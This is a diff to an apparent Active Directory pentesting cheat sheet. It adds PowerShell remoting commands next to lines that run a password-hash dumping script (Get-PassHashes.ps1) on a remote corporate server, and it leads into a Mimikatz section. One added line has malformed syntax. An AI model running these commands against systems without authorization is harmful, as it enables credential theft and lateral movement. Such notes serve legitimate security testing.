@@ -342,7 +342,14 @@ Invoke-Privesc
 # Execute whoami & hostname commands on the indicated server
 Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName xxxx.corporate.corp.local          
 # Execute the script Git-PassHashes.ps1 on the indicated server
-Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local 
+Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corporate.corp.local
+# Enable Powershell Remoting on current Machine
+Enable-PSRemoting
+# Start a new session
+$sess = New-PSSession -ComputerName <Name>
+# Enter the Session
+Enter-PSSession -ComputerName <Name>
+Enter-PSSession -ComputerName -Sessions <Sessionname>
 ```
 
 - **Invoke-Mimikatz:**
